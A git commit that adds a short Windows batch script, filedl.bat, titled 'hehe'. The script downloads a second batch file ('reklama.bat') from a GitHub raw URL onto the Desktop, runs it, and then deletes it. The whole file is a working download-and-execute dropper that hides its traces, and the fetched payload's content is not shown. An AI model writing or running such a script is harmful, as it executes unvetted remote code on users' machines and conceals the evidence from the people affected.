5281dafe4faede5d589fbcddcaa0373d423a173b
Kachi <46286269+kamilix2003@users.noreply.github.com>
2021-11-05 18:31:25 +0100

    Add files via upload

---
+++ filedl.bat
@@ -0,0 +1,13 @@
+title hehe
+echo off
+cd Desktop
+
+curl https://raw.githubusercontent.com/kamilix2003/pejAD/master/reklama.bat > temp.bat
+
+timeout 1
+
+start temp.bat
+ 
+timeout 1 
+
+del temp.bat
